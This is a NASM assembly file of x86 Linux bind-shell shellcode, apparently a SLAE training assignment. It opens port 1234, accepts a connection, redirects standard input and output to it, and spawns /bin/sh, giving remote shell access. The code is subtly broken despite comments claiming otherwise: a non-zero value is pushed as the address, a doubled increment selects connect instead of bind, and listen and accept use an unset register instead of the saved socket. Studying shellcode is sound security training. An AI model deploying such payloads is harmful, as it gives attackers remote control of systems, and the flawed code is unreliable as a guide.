; bind.nasm
; 
; TCP port bind shellcode
;
; Author: SLAE - 1314


global _start 

section .text
 
_start: 

; zeroing out all registers
xor eax, eax 
xor ebx, ebx 
xor edx, edx
xor edi, edi


;;#define __NR_socketcall 102 
;;int socketcall(int call, unsigned long *args);
mov al, 0x66     ; call SocketCall() in order to use the SYS_SOCKET argument
mov bl, 0x1      ; define the SYS_SOCKET value to be 0x1. The value can be stored at bl in order to avoid null values

;;sockfd = socket(AF_INET,SOCK_STREAM,0);
push edx         ; push 0 value to the stack regarding the protocol argument
push ebx         ; SOCK_STREAM constant at type argument 
push byte 0x2    ; AF_INET constant at domain argument

mov ecx, esp     ; point ECX at the top of the stack 
int 0x80         ; call syscall interrupt to execute the arguments 
mov edi, eax     ; EAX will store the return value of the socket 
                 ; descriptor. the sockfd will be needed to other 
                 ; syscalls so it will be saved at EDI register.  
                 ; Also we will need the EAX register to use with other syscalls

;;#define __NR_socketcall 102 
;;int socketcall(int call, unsigned long *args);

mov al, 0x66     ; call SocketCall() in order to use the SYS_BIND argument
inc bl           ; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall 

;;server.sin_family = AF_INET; 
;;server.sin_port = htons(PORT);
;;server.sin_addr.s_addr = INADDR_ANY; 

push eax         ; INADDR_ANY 0.0.0.0
push word 0xd204 ; port value 1234 in Network Byte order
push byte 0x2    ; AF_INET constant 
mov ecx, esp     ; stack alignment. ECX points to struct

;; bind(sockfd, (struct sockaddr *) &server, sizeof(server));
;; using the strace command the following output gives the values used 
;; bind(3, {sa_family=AF_INET, sin_port=htons(1234), sin_addr=inet_addr("0.0.0.0")}, 16)

mov al, 0x66 ; call SocketCall() in order to use the SYS_BIND argument
inc bl       ; increase the ebx from 0x1 to 0x2 which indicates the bind() syscall 

push byte 0x10   ; sizeof(server)
push ecx         ; (struct sockaddr *) &server
push edi         ; sockfd 
mov ecx, esp     ; point ECX at the top of the stack 
int 0x80         ; call syscall interrupt to execute the arguments
 
;;listen(sockfd, 0);
push edx         ; push 0 into the stack 
push esi         ; push sockfd descriptor
mov ecx, esp     ; now point to Listen() syscall
add ebx, 0x2     ; add 0x2 to ebx that has the value 0x2. 0x4 indicates the listen() syscall 
mov al, 0x66     ; call SocketCall() in order to use the SYS_LISTEN argument
int 0x80         ; call syscall interrupt to execute the arguments

;;accept(sockfd, NULL, NULL);
mov al, 0x66 ; call SocketCall() in order to use the SYS_ACCEPT argument
inc bl       ; increase the ebx from 0x4 to 0x5 which indicates the Accept() syscall 
push edx     ; push NULL into the stack
push edx     ; push NULL into the stack
push esi     ; push sockfd descriptor 
mov ecx, esp ; point to Accept()
int 0x80     ; call syscall interrupt to execute the arguments


;;dup2(resfd, 2); 
;;dup2(resfd, 1); 
;;dup2(resfd, 0); 
mov ebx, eax      ; the first argument in dup2 has the returned socket descriptor from accept syscall. ebx now has the returned socket descriptor (resfd).
xor ecx, ecx      ; zero out the ecx register before use it  
lo:
    mov al, 0x3f  ; the functional number that indicates dup2 (63 in dec)
    int 0x80      ; call dup2 syscall
    inc ecx       ; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr)
    cmp cl, 0x2   ; compare ecx with 2 which indicates the stderr descriptor
    jle lo        ; loop until counter is less or equal to 2

;; execve("/bin/sh", NULL, NULL);
xor eax, eax     ; zero out the eax register 
push eax         ; push NULL into the stack  
push 0x68732f2f  ; push "hs//" in reverse order into stack 
push 0x6e69622f  ; push "nib/" in reverse order into stack 
mov ebx, esp     ; point ebx into stack
push eax         ; push NULL into the stack 
mov edx, esp      ; point to edx into stack  
push ebx         ; push ebx into stack 
mov ecx, esp     ; point to ecx into stack 
mov al, 0xb      ; 0xb indicates the execve syscall 
int 0x80         ; execute execve syscall 
